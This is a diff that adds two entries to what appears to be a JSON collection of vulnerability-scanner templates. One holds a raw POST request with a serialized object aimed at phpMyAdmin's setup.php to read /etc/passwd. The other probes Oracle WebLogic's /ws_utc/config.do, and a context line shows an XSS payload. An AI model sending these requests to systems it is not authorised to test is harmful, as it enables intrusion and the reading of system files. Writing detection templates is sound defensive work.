@@ -146,6 +146,40 @@
       ]
     },
     {
+      "id": "CVE-2009-1151",
+      "info": {
+        "author": "princechaddha",
+        "description": "Setup script used to generate configuration can be fooled using a crafted POST request to include arbitrary PHP code in generated configuration file. Combined with ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.",
+        "name": "PhpMyAdmin Scripts/setup.php Deserialization Vulnerability",
+        "reference": "https://www.phpmyadmin.net/security/PMASA-2009-3/",
+        "severity": "high",
+        "tags": "phpmyadmin,rce,deserialization",
+        "vulhub": "https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /scripts/setup.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 80\n\naction=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2861",
       "info": {
         "author": "pikpikcu",
@@ -2530,6 +2564,36 @@
           "path": [
             "{{BaseURL}}/servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-2894",
+      "info": {
+        "author": "geeknik",
+        "description": "Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server.",
+        "name": "Oracle WebLogic RCE",
+        "reference": "https://blog.detectify.com/2018/11/14/technical-explanation-of-cve-2018-2894-oracle-weblogic-rce/",
+        "severity": "critical",
+        "tags": "cve,cve2018,oracle,weblogic,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "conditon": "and",
+              "type": "word",
+              "words": [
+                "* Copyright (c) 2005,2013, Oracle",
+                "<title>settings</title>"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ws_utc/config.do"
+          ],
+          "redirects": true
         }
       ]
     },
